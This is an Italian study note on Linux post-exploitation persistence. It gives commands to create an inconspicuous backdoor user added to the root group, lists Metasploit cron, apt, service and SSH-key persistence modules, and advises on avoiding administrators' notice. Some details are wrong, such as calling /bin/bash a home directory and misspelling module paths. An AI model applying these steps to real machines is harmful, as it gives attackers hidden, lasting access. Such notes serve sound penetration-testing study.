
# Persistenza in Linux
La persistenza in un sistema operativo consiste in una serie di tecniche atte ad automatizzare l'accesso ad una macchinia target da parte di un attaccante tramite uno script che viene eseguito ogni volta che la macchina é attiva, mantenendo la persistenza nel sistema da un attaccante anche se la macchina viene spenta o riavviata. <br>
Ovviamente, per avere una persistenza su un target, dobbiamo prima avere una sessione con permessi elevati. <br>
una tecnica puó essere quella di creare un utente backdoor in modo da poterci autenticare con quel determinato utente alla macchina target: 
```bash
useradd -m <protocollo> -s /bin/bash
<password>
<passwordAgain>
```
come portocollo possiamo ad esempio mettere `ftp` in modo da creare un utente con quel nome e non destare sospetti dato che se elenchiamo tutti gli utenti presenti nel file `/etc/passwd` saranno elencati anche gli utenti in base al protocollo in esecuzione sulla macchina. <br>
`/bin/bash` é la home directory per quell'utente. <br>

dopo aver creato un utente, usiamo un account root per poterlo assegnare al gruppo di utenti root
```bash
usermod -aG root <name>
groups <name>             # per confermare che l'utente creato fa parte del gruppo dei root
```
possiamo anche specificare un user ID
```bash
usermod -u 15 <name>
```

## Moduli di persistenza Linux
esistono anche dei moduli che automatizzano il processo di creazione di una persistenza su un sistema target
```bash
use exploit/linux/loca/apt_package_manager_persistence     # 
use exploit/linux/loca/cron_persistence                    # crea un cronjob che viene continuamente eseguito per potersi connettere a un multi/handler
use exploit/linux/loca/service_persistence                 #
use post/linux/menage/sshkey_persistance  #RACCOMANDATO    # imposta una coppia di chiavi privata e pubblica ssh e aggiunge le chiavi pubbliche nella directory home di tutti gli account nel sistema
set CREATESSHFOLDER true
```
i cronjobs per la persistenza vengono spesso identificati dagli amministratori di sistema quindi non é consigliato usarli per non destare sospetti. 
> per il modulo di persistenza con i cronjobs consiglio di impostare una porta diversa da quella usata per exploitare il target

dopo aver eseguito il modulo di persistenzaa con le ssh key, otterremo in un path un file che contiene una chiave ssh che possiamo usare per autenteicarci a qualisiasi utente presente nel sistema target tramite il nomale terminale linux (fuori da Metasploit). <br>
Creiamo un file contenente la chaive ssh e lo chaiamiamo `ssh_key` 
```bash
chmod 0400 ssh_key
ssh -i ssh_key <username>@<IP>
yes
```

---
